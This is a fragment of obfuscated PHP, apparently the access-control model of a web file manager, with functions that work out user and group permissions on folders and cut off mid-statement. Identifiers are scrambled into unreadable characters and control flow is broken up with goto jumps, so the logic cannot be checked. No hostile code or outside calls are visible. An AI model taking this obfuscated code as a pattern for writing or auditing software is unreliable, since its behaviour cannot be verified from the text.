¾ || !$AïÅ’§“ò) { return !1; } foreach ($AïÅ’§“ò as $b®Š§ÌÄÌĞ) { $B¬çŒÁ° = array(); foreach ($b®Š§ÌÄÌĞ[$c¢¢¥”áë¥[2274]] as $Eô£Ú§æ©È) { $B–‡®•ì“Ë = $Eô£Ú§æ©È[$c¢¢¥”áë¥[418]]; $fÑ¾ÚŠ÷™ = $Eô£Ú§æ©È[$c¢¢¥”áë¥[1437]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Fµ™òËª‹Ã = $Eô£Ú§æ©È[$c¢¢¥”áë¥[1437]] ? $Eô£Ú§æ©È[$c¢¢¥”áë¥[1437]] : $Eô£Ú§æ©È[$c¢¢¥”áë¥[2108]]; if ($Eô£Ú§æ©È[$c¢¢¥”áë¥[1437]] && $Eô£Ú§æ©È[$c¢¢¥”áë¥[1437]] == $cÌ°÷é™Œø) { continue; } $B¬çŒÁ°[] = array($c¢¢¥”áë¥[369] => $b®Š§ÌÄÌĞ[$c¢¢¥”áë¥[369]], $c¢¢¥”áë¥[371] => $fÑ¾ÚŠ÷™, $c¢¢¥”áë¥[458] => intval($Fµ™òËª‹Ã), $c¢¢¥”áë¥[2252] => isset($B–‡®•ì“Ë[$c¢¢¥”áë¥[367]]) ? intval($B–‡®•ì“Ë[$c¢¢¥”áë¥[367]]) : 0, $c¢¢¥”áë¥[2253] => isset($B–‡®•ì“Ë[$c¢¢¥”áë¥[2253]]) ? intval($B–‡®•ì“Ë[$c¢¢¥”áë¥[2253]]) : -1); } $B¬çŒÁ°[] = array($c¢¢¥”áë¥[369] => $b®Š§ÌÄÌĞ[$c¢¢¥”áë¥[369]], $c¢¢¥”áë¥[371] => SourceModel::TYPE_USER, $c¢¢¥”áë¥[458] => intval($cÌ°÷é™Œø), $c¢¢¥”áë¥[2252] => intval($FÓä„Ù ¾), $c¢¢¥”áë¥[2253] => -1); $this->where(array($c¢¢¥”áë¥[383] => $b®Š§ÌÄÌĞ[$c¢¢¥”áë¥[369]]))->delete(); $this->addAll($B¬çŒÁ°); } return !0; } public function get($B÷„ÅÇ‡ÆÔ) { $a‰°ÎÈ…  = $this->getSourceList(array($B÷„ÅÇ‡ÆÔ), !0); return $a‰°ÎÈ… [0]; } public function getSourceList($aŠÀ­™àĞÌ, $c„é­²¨ˆ = false, $C“ç˜™Ëç = false) { goto C±…‚±··í; cß‰É‚šï: $AôÍ¢™Ç¾Ö = array_to_keyvalue_group($AôÍ¢™Ç¾Ö, $bâÇÕ¢İ­Ì[369]); $F†¨ãºâ‰ = array(); foreach ($Eé¦¬ùƒÈê as $B÷‰Å»’Üó) { if (isset($AôÍ¢™Ç¾Ö[$B÷‰Å»’Üó])) { $F†¨ãºâ‰[$B÷‰Å»’Üó] = $AôÍ¢™Ç¾Ö[$B÷‰Å»’Üó]; } } goto d˜©‹ïï; d˜©‹ïï: $Ağº†¬ã = $this->userIsRoot($C“ç˜™Ëç); $Eå²«ÏƒÖ = array($bâÇÕ¢İ­Ì[377] => 0, $bâÇÕ¢İ­Ì[2280] => array($bâÇÕ¢İ­Ì[385] => 0, $bâÇÕ¢İ­Ì[2114] => 0, $bâÇÕ¢İ­Ì[386] => LNG($bâÇÕ¢İ­Ì[2281]), $bâÇÕ¢İ­Ì[2127] => $bâÇÕ¢İ­Ì[2282])); $c­©¹¬ˆ¨é = array(); goto EÆ¨»Á°è; C±…‚±··í: $bâÇÕ¢İ­Ì =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$aŠÀ­™àĞÌ) { return array(); } $eßõ¢ä¥„ = Model($bâÇÕ¢İ­Ì[1114]); goto FÎ•»¡àÛ‚; fªâ°Ö¸à·: $a”»ŒöÄÖ· = $bâÇÕ¢İ­Ì[2279]; $B­êä°¹ÛÛ = array($bâÇÕ¢İ­Ì[383] => array($bâÇÕ¢İ­Ì[384], $Eé¦¬ùƒÈê)); $AôÍ¢™Ç¾Ö = $this->field($a”»ŒöÄÖ·)->where($B­êä°¹ÛÛ)->select(); goto cß‰É‚šï; cÀƒ®ôñ…à: foreach ($c„é­²¨ˆ as $açÜÎ»Á—Ô => $c‰ˆ²ô±„) { $c²ÀÎÃ‡› = $eßõ¢ä¥„->parentLevelArray($c‰ˆ²ô±„[$bâÇÕ¢İ­Ì[461]]); $Eé¦¬ùƒÈê = array_merge($Eé¦¬ùƒÈê, array($açÜÎ»Á—Ô), array_reverse($c²ÀÎÃ‡›)); } $Eé¦¬ùƒÈê = array_values(array_unique($Eé¦¬ùƒÈê)); if (!$Eé¦¬ùƒÈê) { return array(); } goto fªâ°Ö¸à·; EÆ¨»Á°è: foreach ($c„é­²¨ˆ as $B÷‰Å»’Üó => $eœäùÜ‰èˆ) { if ($Ağº†¬ã) { $c­©¹¬ˆ¨é[$B÷‰Å»’Üó] = $Eå²«ÏƒÖ; continue; } $c­©¹¬ˆ¨é[$B÷‰Å»’Üó] = $this->makeSourceAuth($eœäùÜ‰èˆ, $F†¨ãºâ‰, $C“ç˜™Ëç); } return $c­©¹¬ˆ¨é; goto e¾Ã‚×Ò; FÎ•»¡àÛ‚: if (!$c„é­²¨ˆ && count($aŠÀ­™àĞÌ) == 1) { $c„é­²¨ˆ = array(); $c„é­²¨ˆ[$aŠÀ­™àĞÌ[0]] = $eßõ¢ä¥„->sourceInfo($aŠÀ­™àĞÌ[0]); } if (!$c„é­²¨ˆ) { $B­êä°¹ÛÛ = array($bâÇÕ¢İ­Ì[383] => array($bâÇÕ¢İ­Ì[384], $aŠÀ­™àĞÌ)); $c„é­²¨ˆ = $eßõ¢ä¥„->field($bâÇÕ¢İ­Ì[2278])->where($B­êä°¹ÛÛ)->select(); $c„é­²¨ˆ = array_to_keyvalue($c„é­²¨ˆ, $bâÇÕ¢İ­Ì[369]); } $Eé¦¬ùƒÈê = $aŠÀ­™àĞÌ; goto cÀƒ®ôñ…à; e¾Ã‚×Ò: } public function authDeepCheck($E—„åôçï, $DÄÆ¤²¸¨¯ = false) { goto F¢“—çÛÎ¬; AÍ–Æ•ª„Ü: if (!in_array($E—„åôçï, $A¿õÙÀãÊ•[$CÎâÇ¥Ù×µ[2283]])) { return !1; } $dÅŠ¦ˆÀƒŸ = array(); foreach ($A¿õÙÀãÊ•[$CÎâÇ¥Ù×µ[2284]] as $fªˆ±ÜˆÓ => $F‡‘¬§¼Ì) { if (!in_array($E—„åôçï, $F‡‘¬§¼Ì)) { continue; } $dÅŠ¦ˆÀƒŸ[] = $fªˆ±ÜˆÓ; } goto EÈÍ»•ÁÛ×; EÈÍ»•ÁÛ×: $f”ª †Çöù = $dÅŠ¦ˆÀƒŸ ? $dÅŠ¦ˆÀƒŸ[0] : $E—„åôçï; return array($CÎâÇ¥Ù×µ[377] => -1, $CÎâÇ¥Ù×µ[418] => array($CÎâÇ¥Ù×µ[385] => $CÎâÇ¥Ù×µ[1028], $CÎâÇ¥Ù×µ[2114] => $CÎâÇ¥Ù×µ[470], $CÎâÇ¥Ù×µ[386] => LNG($CÎâÇ¥Ù×µ[2285]), $CÎâÇ¥Ù×µ[2127] => $CÎâÇ¥Ù×µ[2286]), $CÎâÇ¥Ù×µ[2287] => LNG($CÎâÇ¥Ù×µ[2288]), $CÎâÇ¥Ù×µ[2289] => $this->sourceAuthInfo($f”ª †Çöù)); goto C•ä²š…·§; F¢“—çÛÎ¬: $CÎâÇ¥Ù×µ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $DÄÆ¤²¸¨¯ = $DÄÆ¤²¸¨¯ ? $DÄÆ¤²¸¨¯ : USER_ID; $A¿õÙÀãÊ• = $this->makeAuthDeep($DÄÆ¤²¸¨¯); goto AÍ–Æ•ª„Ü; C•ä²š…·§: } protected function makeAuthDeep($Aõ”ª¹—Â¢ = false) { goto açŞäôô¦Œ; açŞäôô¦Œ: $C‡†­¡õºö =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; static $CÂÒíˆÓŒô = array(); $Aõ”ª¹—Â¢ = $Aõ”ª¹—Â¢ ? $Aõ”ª¹—Â¢ : USER_ID; goto eÅÖ·öÛÑé; eõ²íÓù°: foreach ($b®ó©™²µ÷ as $a¦œÁ×‹çÚ => $E‚ Ã×¿…İ) { $AÏêĞÍ‚äå = $A‰ö¦ÙŠß‰[$a¦œÁ×‹çÚ]; if (!$AÏêĞÍ‚äå || !$Eº£…Ş…È¡[$AÏêĞÍ‚äå]) { continue; } $AÆ‹ïáÍù = array(); foreach ($b¨Á™èŒÁò[$AÏêĞÍ‚äå] as $Bˆ´ÂÑÏ±Š) { $AÆ‹ïáÍù[] = $Eº£…Ş…È¡[$Bˆ´ÂÑÏ±Š]; } $b®ó©™²µ÷[$a¦œÁ×‹çÚ] = array_merge($AÆ‹ïáÍù, $E‚ Ã×¿…İ); } $C×Ü—ì©œ = array_values(array_unique($C×Ü—ì©œ)); $Aõ×ˆÔÚ” = array($C‡†­¡õºö[2283] => $C×Ü—ì©œ, $C‡†­¡õºö[2284] => $b®ó©™²µ÷); goto A¨„¼ß‡Ôâ; CØÂÀÅ‡À±: if ($cöÄ§ƒ¯à) { $BÛºÊ¼Üİ£ = array(array($C‡†­¡õºö[371] => SourceModel::TYPE_USER, $C‡†­¡õºö[458] => $Aõ”ª¹—Â¢), array($C‡†­¡õºö[371] => SourceModel::TYPE_GROUP, $C‡†­¡õºö[458] => array($C‡†­¡õºö[384], $cöÄ§ƒ¯à)), $C‡†­¡õºö[910] => $C‡†­¡õºö[2193]); } if ($c‘˜Ôø„¬¨) { $BÛºÊ¼Üİ£ = array($BÛºÊ¼Üİ£, $C‡†­¡õºö[2252] => array($C‡†­¡õºö[2291], $c‘˜Ôø„¬¨)); } $c±†º·× = $this->field($C‡†­¡õºö[2292])->where($BÛºÊ¼Üİ£)->select(); goto Bƒ²ã„¶‡Œ; D˜Ûà ŒÛ: $A‰ö¦ÙŠß‰ = array(); $Eº£…Ş…È¡ = array(); $b¨Á™èŒÁò = array(); goto D¡‰’ä‡; A¨„¼ß‡Ôâ: $CÂÒíˆÓŒô[$Aõ”ª¹—Â¢] = $Aõ×ˆÔÚ”; return $Aõ×ˆÔÚ”; goto EŒ†š§øö; eÅÖ·öÛÑé: if (isset($CÂÒíˆÓŒô[$Aõ”ª¹—Â¢])) { return $CÂÒíˆÓŒô[$Aõ”ª¹—Â¢]; } $e´õ­ôŸé = Model($C‡†­¡õºö[2290])->listData(); $c‘˜Ôø„¬¨ = array(); goto Cİ‰Ÿ’ºŒ; F¸ôí¢Ë¦¹: $aëêœÄàÚ = Model($C‡†­¡õºö[1114]); $c®º¦ªªùš = Model($C‡†­¡õºö[460]); $b®ó©™²µ÷ = array(); goto D˜Ûà ŒÛ; Cİ‰Ÿ’ºŒ: foreach ($e´õ­ôŸé as $bô Íø‰Æ) { if ($bô Íø‰Æ[$C‡†­¡õºö[376]] == 0 && $bô Íø‰Æ[$C‡†­¡õºö[2129]] == $C‡†­¡õºö[83]) { $c‘˜Ôø„¬¨[] = $bô Íø‰Æ[$C‡†­¡õºö[367]]; } } $cöÄ§ƒ¯à = $this->userGroupParents($Aõ”ª¹—Â¢); $BÛºÊ¼Üİ£ = array($C‡†­¡õºö[371] => SourceModel::TYPE_USER, $C‡†­¡õºö[458] => $Aõ”ª¹—Â¢); goto CØÂÀÅ‡À±; D¡‰’ä‡: if ($aÆÓùÄ®æï) { $b³Æ”ÈÔ¿³ = $aëêœÄàÚ->where(array($C‡†­¡õºö[369] => array($C‡†­¡õºö[384], $aÆÓùÄ®æï)))->select(); foreach ($b³Æ”ÈÔ¿³ as $DºÍãÂ®¼) { $dá¶ƒ¤•ê¼ = $aëêœÄàÚ->parentLevelArray($DºÍãÂ®¼[$C‡†­¡õºö[461]]); $C×Ü—ì©œ = array_merge($C×Ü—ì©œ, $dá¶ƒ¤•ê¼); $d¥İŞö‘¨[] = $DºÍãÂ®¼[$C‡†­¡õºö[458]]; $b®ó©™²µ÷[$DºÍãÂ®¼[$C‡†­¡õºö[369]]] = $dá¶ƒ¤•ê¼; $A‰ö¦ÙŠß‰[$DºÍãÂ®¼[$C‡†­¡õºö[369]]] = $DºÍãÂ®¼[$C‡†­¡õºö[458]]; } } $d¥İŞö‘¨ = array_values(array_unique($d¥İŞö‘¨)); $eùáÚ‘ƒ•¦ = $d¥İŞö‘¨; goto b•µà Ö; b•µà Ö: foreach ($eùáÚ‘ƒ•¦ as $Bˆ´ÂÑÏ±Š) { $bìùË’ãÍÄ = $c®º¦ªªùš->getInfo($Bˆ´ÂÑÏ±Š); $dá¶ƒ¤•ê¼ = $aëêœÄàÚ->parentLevelArray($bìùË’ãÍÄ[$C‡†­¡õºö[461]]); $d¥İŞö‘¨ = array_merge($d¥İŞö‘¨, $dá¶ƒ¤•ê¼); } $d¥İŞö‘¨ = array_values(array_unique($d¥İŞö‘¨)); foreach ($d¥İŞö‘¨ as $Bˆ´ÂÑÏ±Š) { $bìùË’ãÍÄ = $c®º¦ªªùš->getInfo($Bˆ´ÂÑÏ±Š); $C×Ü—ì©œ[] = $bìùË’ãÍÄ[$C‡†­¡õºö[391]][$C‡†­¡õºö[369]]; $Eº£…Ş…È¡[$Bˆ´ÂÑÏ±Š] = $bìùË’ãÍÄ[$C‡†­¡õºö[391]][$C‡†­¡õºö[369]]; $b¨Á™èŒÁò[$Bˆ´ÂÑÏ±Š] = $aëêœÄàÚ->parentLevelArray($bìùË’ãÍÄ[$C‡†­¡õºö[461]]); } goto eõ²íÓù°; Bƒ²ã„¶‡Œ: $aÆÓùÄ®æï = array_to_keyvalue($c±†º·×, $C‡†­¡õºö[33], $C‡†­¡õºö[369]); $C×Ü—ì©œ = array(); $d¥İŞö‘¨ = $cöÄ§ƒ¯à; goto F¸ôí¢Ë¦¹; EŒ†š§øö: } private function makeSourceAuth($FÁí¿¦ğ£¼, $Eäí¨âã­•, $f¨œÁÍ ³™ = false) { goto D³¹ÌµßÇ³; A˜»çíâåâ: $B°›×é¾¨Ò = $FÁí¿¦ğ£¼[$Aø³¥ñÁ—é[371]] == SourceModel::TYPE_GROUP; $cÇ²¶…»’Õ = $B°›×é¾¨Ò ? $this->groupRootAuth($e¨’©Œô“ô, $f¨œÁÍ ³™) : !1; if ($cÇ²¶…»’Õ && Model($Aø³¥ñÁ—é[2271])->authCheckAction($cÇ²¶…»’Õ[$Aø³¥ñÁ—é[376]], $Aø³¥ñÁ—é[1563])) { return $this->groupAuthInfo($cÇ²¶…»’Õ, $e¨’©Œô“ô); } goto dİÑ‰‹´íÏ; cäÁ…†Ğë: foreach ($Bå“¼ƒĞ as $D±ÇŞ‚èÕ†) { if (!isset($Eäí¨âã­•[$D±ÇŞ‚èÕ†])) { continue; } $bñ¦½ğ–¯† = $this->authMake($Eäí¨âã­•[$D±ÇŞ‚èÕ†], $f¨œÁÍ ³™); if ($bñ¦½ğ–¯†[$Aø³¥ñÁ—é[418]]) { $cÖ”›Ìƒó = $bñ¦½ğ–¯†; break; } } if (!$B°›×é¾¨Ò) { return $cÖ”›Ìƒó; } if (!$cÖ”›Ìƒó && $cÇ²¶…»’Õ) { $cÖ”›Ìƒó = $this->groupAuthInfo($cÇ²¶…»’Õ, $e¨’©Œô“ô); } goto Cø×²ŞöÀ; Cø×²ŞöÀ: if (!$cÖ”›Ìƒó) { $C¯ä‚÷‚¨– = Model($Aø³¥ñÁ—é[460])->getInfo($e¨’©Œô“ô); $FŒà»…ÕÉÉ = explode($Aø³¥ñÁ—é[47], trim($C¯ä‚÷‚¨–[$Aø³¥ñÁ—é[461]], $Aø³¥ñÁ—é[47])); foreach ($FŒà»…ÕÉÉ as $eÂëØà—ë) { if ($eÂëØà—ë == $Aø³¥ñÁ—é[470] || $eÂëØà—ë == $D÷Î£’Ä) { continue; } $bİ§±èŞ²– = $this->groupRootAuth($eÂëØà—ë, $f¨œÁÍ ³™); if (!$bİ§±èŞ²–) { continue; } $cÖ”›Ìƒó = $this->groupAuthInfo($bİ§±èŞ²–, $eÂëØà—ë); break; } } if (!$cÖ”›Ìƒó || $cÖ”›Ìƒó[$Aø³¥ñÁ—é[377]] <= 0) { $fˆÄ£Ê„®¶ = $this->authDeepCheck($FÁí¿¦ğ£¼[$Aø³¥ñÁ—é[369]], $f¨œÁÍ ³™); if ($fˆÄ£Ê„®¶) { $cÖ”›Ìƒó = $fˆÄ£Ê„®¶; } } return $cÖ”›Ìƒó; goto aÍ¾­Ø´ƒ; dİÑ‰‹´íÏ: $Bå“¼ƒĞ = Model($Aø³¥ñÁ—é[1114])->parentLevelArray($FÁí¿¦ğ£¼[$Aø³¥ñÁ—é[461]]); $Bå“¼ƒĞ = array_merge(array($FÁí¿¦ğ£¼[$Aø³¥ñÁ—é[369]]), array_reverse($Bå“¼ƒĞ)); $cÖ”›Ìƒó = !1; goto cäÁ…†Ğë; D³¹ÌµßÇ³: $Aø³¥ñÁ—é =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $D÷Î£’Ä = $Aø³¥ñÁ—é[83]; $e¨’©Œô“ô = $FÁí¿¦ğ£¼[$Aø³¥ñÁ—é[458]]; goto A˜»çíâåâ; aÍ¾­Ø´ƒ: } private function userIsRoot($f—‡ƒÅù = false) { $cã…¾£¿ØÀ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (!$f—‡ƒÅù && _get($GLOBALS, $cã…¾£¿ØÀ[459])) { return !0; } $B°ÎÁ¥÷¦ = Model($cã…¾£¿ØÀ[479])->getInfo($f—‡ƒÅù); $c•¯ŠŠ§¾é = Model($cã…¾£¿ØÀ[2293])->listData($B°ÎÁ¥÷¦[$cã…¾£¿ØÀ[1322]]); if ($c•¯ŠŠ§¾é && $c•¯ŠŠ§¾é[$cã…¾£¿ØÀ[1191]][$cã…¾£¿ØÀ[2294]] == 1) { return !0; } return !1; } private function sourceAuthInfo($a¾§¾´õš) { goto d¡áÀºÑƒ; A½ÃˆÎ©: if (!$bØ¨œáãØ¦) { return !1; } $c¦¡ê‡Šø–->groupPathDisplay($bØ¨œáãØ¦); $Fª¦ÊäõÄç = array($bØ¨œáãØ¦); goto C³¹ï–ĞËˆ; d¡áÀºÑƒ: $A³¯Çº­Ç§ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $c¦¡ê‡Šø– = Model($A³¯Çº­Ç§[1114]); $bØ¨œáãØ¦ = $c¦¡ê‡Šø–->sourceInfo($a¾§¾´õš); goto A½ÃˆÎ©; C­–À„Õë«: if (isset($bØ¨œáãØ¦[$A³¯Çº­Ç§[466]])) { $bô¸Ôó÷íÏ = explode($A³¯Çº­Ç§[8], trim($bØ¨œáãØ¦[$A³¯Çº­Ç§[468]], $A³¯Çº­Ç§[8])); array_shift($bô¸Ôó÷íÏ); $fÍòŠƒÄ›ø = $bØ¨œáãØ¦[$A³¯Çº­Ç§[464]] . $A³¯Çº­Ç§[2295] . implode($A³¯Çº­Ç§[8], $bô¸Ôó÷íÏ); } return array($A³¯Çº­Ç§[386] => $bØ¨œáãØ¦[$A³¯Çº­Ç§[28]], $A³¯Çº­Ç§[75] => KodIO::make($bØ¨œáãØ¦[$A³¯Çº­Ç§[369]]), $A³¯Çº­Ç§[2296] => $fÍòŠƒÄ›ø); goto e­‡ÎˆÜ›±; C³¹ï–ĞËˆ: $Fª¦ÊäõÄç = $c¦¡ê‡Šø–->_listAppendPath($Fª¦ÊäõÄç); $bØ¨œáãØ¦ = $Fª¦ÊäõÄç[0]; $fÍòŠƒÄ›ø = $bØ¨œáãØ¦[$A³¯Çº­Ç§[468]]; goto C­–À„Õë«; e­‡ÎˆÜ›±: } private function groupAuthInfo($Cõ£´£¤²—, $aæªŸÌ—•ä) { $f‘„ø Àù— =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $a†ï¸˜­Í“ = Model($f‘„ø Àù—[460])->getInfo($aæªŸÌ—•ä); return array($f‘„ø Àù—[2297] => intval($Cõ£´£¤²—[$f‘„ø Àù—[376]]), $f‘„ø Àù—[2280] => $Cõ£´£¤²—, $f‘„ø Àù—[2298] => LNG($f‘„ø Àù—[2299]), $f‘„ø Àù—[2289] => array($f‘„ø Àù—[386] => $a†ï¸˜­Í“[$f‘„ø Àù—[28]], $f‘„ø Àù—[75] => KodIO::make($a†ï¸˜­Í“[$f‘„ø Àù—[391]][$f‘„ø Àù—[369]]), $f‘„ø Àù—[2296] => $a†ï¸˜­Í“[$f‘„ø Àù—[465]])); } protected function groupRootAuth($CÈ„­«†ÑÛ, $bŠöº©£… = false) { goto EùºêÌ¿‹¦; CŞÔæÁ´ÜŸ: $BŸÀ‰´“ë« = $eÀ¼ä…ˆ”± ? $this->authMake($eÀ¼ä…ˆ”±, $bŠöº©£…) : !1; $eÈÕë’İ·æ[$BêÓ»÷ñ] = $BŸÀ‰´“ë« ? $BŸÀ‰´“ë«[$E·¢ß§šï[418]] : $Cß†÷¢„§; return $eÈÕë’İ·æ[$BêÓ»÷ñ]; goto E‰ÕÉ­ÀÔ; EùºêÌ¿‹¦: $E·¢ß§šï =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $bŠöº©£… = $bŠöº©£… ? $bŠöº©£… : USER_ID; $BêÓ»÷ñ = $bŠöº©£… . $E·¢ß§šï[2300] . $CÈ„­«†ÑÛ; goto F×ÑÕ«Òø; C£ì½ÛÍ£Â: $Cß†÷¢„§ = isset($aéÅ¬İùº[$CÈ„­«†ÑÛ]) ? $aéÅ¬İùº[$CÈ„­«†ÑÛ][$E·¢ß§šï[376]] : !1; if ($Cß†÷¢„§ && Model($E·¢ß§šï[2271])->authCheckAction($Cß†÷¢„§[$E·¢ß§šï[376]], $E·¢ß§šï[1563])) { $eÈÕë’İ·æ[$BêÓ»÷ñ] = $Cß†÷¢„§; return $Cß†÷¢„§; } $AÜŸ„­µ‹ = Model($E·¢ß§šï[460])->getInfo($CÈ„­«†ÑÛ); goto aÊ–®•„äí; F×ÑÕ«Òø: static $eÈÕë’İ·æ = array(); if (isset($eÈÕë’İ·æ[$BêÓ»÷ñ])) { return $eÈÕë’İ·æ[$BêÓ»÷ñ]; } $aéÅ¬İùº = $this->userGroupList($bŠöº©£…); goto C£ì½ÛÍ£Â; aÊ–®•„äí: $Dù¹áÚ¦Ş• = array($E·¢ß§šï[369] => $AÜŸ„­µ‹[$E·¢ß§šï[391]][$E·¢ß§šï[369]]); $B•êš·Ö£¨ = $E·¢ß§šï[2279]; $eÀ¼ä…ˆ”± = $this->field($B•êš·Ö£¨)->cacheMemory()->where($Dù¹áÚ¦Ş•)->select(); goto CŞÔæÁ´ÜŸ; E‰ÕÉ­ÀÔ: } public function authOwnerApply($CöÜª–¼¿—) { goto F°‡½¼É£; e‚¹‰‹Ş×Á: if (count($b¯É¬”ÌÇ) == 0) { $b¯É¬”ÌÇ = $this->authFolderOwnerGroup($CöÜª–¼¿—[$dÚÁò¨ Çë[458]]); } $b¯É¬”ÌÇ = array_unique($b¯É¬”ÌÇ); if (AuthModel::authCheckRoot($CöÜª–¼¿—[$dÚÁò¨ Çë[376]][$dÚÁò¨ Çë[377]])) { $b¯É¬”ÌÇ[] = USER_ID; } goto FİáÜæ„â×; F°‡½¼É£: $dÚÁò¨ Çë =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; if (empty($CöÜª–¼¿—[$dÚÁò¨ Çë[376]]) || isset($CöÜª–¼¿—[$dÚÁò¨ Çë[2301]]) && $CöÜª–¼¿—[$dÚÁò¨ Çë[2301]]) { return $CöÜª–¼¿—; } if (AuthModel::authCheckRoot($CöÜª–¼¿—[$dÚÁò¨ Çë[376]][$dÚÁò¨ Çë[377]])) { return $CöÜª–¼¿—; } goto Fõ¸ì´‹Ì; FİáÜæ„â×: $CöÜª–¼¿—[$dÚÁò¨ Çë[376]][$dÚÁò¨ Çë[2303]] = Model($dÚÁò¨ Çë[476])->userListInfo($b¯É¬”ÌÇ); return $CöÜª–¼¿—; goto Cğ‘óÁ’; Fõ¸ì´‹Ì: $C®¤àÏ¥Œ´ = Model($dÚÁò¨ Çë[1114])->parentLevelArray($CöÜª–¼¿—[$dÚÁò¨ Çë[461]]); $C®¤àÏ¥Œ´ = array_merge(array($CöÜª–¼¿—[$dÚÁò¨ Çë[369]]), array_reverse($C®¤àÏ¥Œ´)); $cÖ¿™‡À› = $dÚÁò¨ Çë[2279]; goto fÂ‰´ŸÂã; c‘Êƒ¨ÁĞ: $b’‹à¯Í = array(); $b¯É¬”ÌÇ = array(); foreach ($a«Şš¸Õƒ as $E‚ªÒÉ†ˆ“ => $c›œƒŒ‘© ) { $Eƒ³×Œ†ÜÎ = $this->authFolderOwnerUser($c›œƒŒ‘© ); $b’‹à¯Í[$E‚ªÒÉ†ˆ“] = $Eƒ³×Œ†ÜÎ; $b¯É¬”ÌÇ = array_merge($b¯É¬”ÌÇ, $Eƒ³×Œ†ÜÎ[$dÚÁò¨ Çë[537]]); if ($Eƒ³×Œ†ÜÎ[$dÚÁò¨ Çë[2302]]) { break; } } goto e‚¹‰‹Ş×Á; fÂ‰´ŸÂã: $cË‰àïÀËò = array($dÚÁò¨ Çë[383] => array($dÚÁò¨ Çë[384], $C®¤àÏ¥Œ´)); $a«Şš¸Õƒ = $this->field($cÖ¿™‡À›)->where($cË‰àïÀËò)->select(); $a«Şš¸Õƒ = array_to_keyvalue_group($a«Şš¸Õƒ, $dÚÁò¨ Çë[369]); goto c‘Êƒ¨ÁĞ; Cğ‘óÁ’: } private function authFolderOwnerGroup($bÌš¨ÀÈ™) { $d‘—ôÏ¡ =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $Cë¸Àˆ „ = Model($d‘—ôÏ¡[2187])->where(array($d‘—ôÏ¡[2108] => $bÌš¨ÀÈ™))->select(); $e†–áÁ“¦Ò = array(); if (!$Cë¸Àˆ „) { return $e†–áÁ“¦Ò; } foreach ($Cë¸Àˆ „ as $dæ•µ•çù£) { $a¢ßöªóÌ¡ = $this->authInfo($dæ•µ•çù£); if (AuthModel::authCheckRoot($a¢ßöªóÌ¡[$d‘—ôÏ¡[376]])) { $e†–áÁ“¦Ò[] = $dæ•µ•çù£[$d‘—ôÏ¡[1437]]; } } return $e†–áÁ“¦Ò; } private function authFolderOwnerUser($AãÙÌ³Ñìï) { $A×¨†ÔŞ”© =& $_SERVER[ŒÌ¶ß×Ç‚ìËƒ]; $ağßÂİËªù = array(); $dÈ›‰ï½± = !1; foreach ($AãÙÌ³Ñìï as $D¡Ÿ¡ò–) { $Eèà‰›­… = $this->authInfo($D¡Ÿ¡ò–); if ($D¡Ÿ¡ò–[$A×¨†ÔŞ”©[458]] == $A×¨†ÔŞ”©[470]) { $dÈ›‰ï½± = !0; } if ($D¡Ÿ¡ò–[$A×¨†ÔŞ”©[371]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($Eèà‰›­…[$A×¨†ÔŞ”©[376]])) { $ağßÂİËªù[] = $D¡Ÿ¡ò–[$A×¨†ÔŞ”©[458]]; } } } return array($A×¨†ÔŞ”©[537] => $ağßÂİËªù, $A×¨†ÔŞ”©[2302] => $dÈ›‰ï½±); } public function authMake($AÃ«Êµèò, $D—íŸæï›² = false) { goto B…“·¦•£; c¿ŞŞõÅÛ: $dØóâ­©Î = 0; $b½®¹à’íÃ = 0; $aŠ¬Š¢³…É = array($Cİ•áÌÊä[369] => 0); goto dÍÔğ¼×Õ; eª²‚–ÖÈ: $A¸¶Ôª½š = 0; $Cø•çÊÓĞ = 0; $B·±î‰²ç = 0; goto f¦—ÉèÀ¤Ú; AÉ…•Á³Ö: $d¿ºÄÊ’ø = 0; $cé‡‰ƒÔŞÒ = 0; $eÈòŸİïÉª = 0; goto eª²‚–ÖÈ; f¦—ÉèÀ¤Ú: $F»ó÷Ÿ‘ò = 1000; $AÃØá‘”µˆ = 0; $d÷ùŸ©ºæ’ = 0; goto c¿ŞŞõÅÛ; dÍÔğ¼×Õ: foreach ($AÃ«Êµèò as $aŠ¬Š¢³…É) { $c¶¢£·‘Ãå = $this->authInfo($aŠ¬Š¢³…É); $a‚ìèîËš³ = $aŠ¬Š¢³…É[$Cİ•áÌÊä[458]]; $Fô¤ìÍ²ç = intval($c¶¢£·‘Ãå[$Cİ•áÌÊä[376]]); if ($aŠ¬Š¢³…É[$Cİ•áÌÊä[371]] == SourceModel::TYPE_USER && $a‚ìèîËš³ == $D—íŸæï›²) { $d¿ºÄÊ’ø = !0; $eÈòŸİïÉª = $c¶¢£·‘Ãå; $cé‡‰ƒÔŞÒ = $Fô¤ìÍ²ç; } else { if ($aŠ¬Š¢³…É[$Cİ•áÌÊä[371]] == SourceModel::TYPE_GROUP && $this->groupContainUser($a‚ìèîËš³, $D—íŸæï›²)) { $A¸¶Ôª½š = !0; $Bˆ½Á¦œ’¦ = $this->groupStepToUserGroup($a‚ìèîËš³, $D—íŸæï›²); if ($Bˆ½Á¦œ’¦ < $F»ó÷Ÿ‘ò) { $F»ó÷Ÿ‘ò = $Bˆ½Á¦œ’¦; $Cø•çÊÓĞ = $Fô¤ìÍ²ç; $B·±î‰²ç = $c¶¢£·‘Ãå; $AÃØá‘”µˆ = $a‚ìèîËš³; } if ($Bˆ½Á¦œ’¦ == $F»ó÷Ÿ‘ò && $Fô¤ìÍ²ç >= $Cø•çÊÓĞ) { $Cø•çÊÓĞ = $Fô¤ìÍ²ç; $B·±î‰²ç = $c¶¢£·‘Ãå; $AÃØá‘”µˆ = $a‚ìèîËš³; } } else { if ($a‚ìèîËš³ == $Cİ•áÌÊä[470]) { $d÷ùŸ©ºæ’ = !0; $b½®¹à’íÃ = $c¶¢£·‘Ãå; $dØóâ­©Î = $Fô¤ìÍ²ç; } } } } if ($d¿ºÄÊ’ø) { $C»•ß‰Úƒ = 